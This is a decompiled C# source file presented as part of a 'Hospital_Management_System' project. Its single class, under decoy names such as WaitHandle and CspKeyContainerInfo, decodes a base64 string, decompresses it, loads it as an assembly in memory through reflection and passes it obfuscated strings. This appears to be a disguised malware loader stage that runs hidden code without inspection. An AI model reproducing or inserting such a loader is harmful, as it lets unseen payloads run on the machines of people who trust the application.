using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Hospital_Management_System;

public class SwitchValueState
{
	public SwitchValueState(string s1)
	{
		CspKeyContainerInfo(s1);
	}

	public byte[] WaitHandle(byte[] B)
	{
		object obj = new MemoryStream(B);
		object obj2 = new DeflateStream((Stream)obj, CompressionMode.Decompress);
		byte[] array = new byte[4];
		NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
		object[] obj3 = new object[3] { array, 0, 4 };
		object[] array2 = obj3;
		bool[] obj4 = new bool[3] { true, false, false };
		bool[] array3 = obj4;
		NewLateBinding.LateCall(obj, (Type)null, "Read", obj3, (string[])null, (Type[])null, obj4, true);
		if (array3[0])
		{
			array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		int num = BitConverter.ToInt32(array, 0);
		NewLateBinding.LateSet(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
		byte[] array4 = new byte[checked(num - 1 + 1)];
		NewLateBinding.LateCall(obj2, (Type)null, "Read", array2 = new object[3] { array4, 0, num }, (string[])null, (Type[])null, array3 = new bool[3] { true, false, true }, true);
		if (array3[0])
		{
			array4 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		if (array3[2])
		{
			num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[2]), typeof(int));
		}
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		return array4;
	}

	public object CspKeyContainerInfo(string s1)
	{
		Type type = Thread.GetDomain().Load(WaitHandle(Convert.FromBase64CharArray(s1.ToCharArray(), 0, s1.Length))).GetTypes()[0];
		PropertyInfo property = type.GetProperty("Jonas");
		property.SetValue(null, new string[3]
		{
			IMethodMessage.xcdasdad,
			IMethodMessage.ccccccccccccccccca,
			"Hospital_Management_System"
		}, null);
		return 0;
	}
}
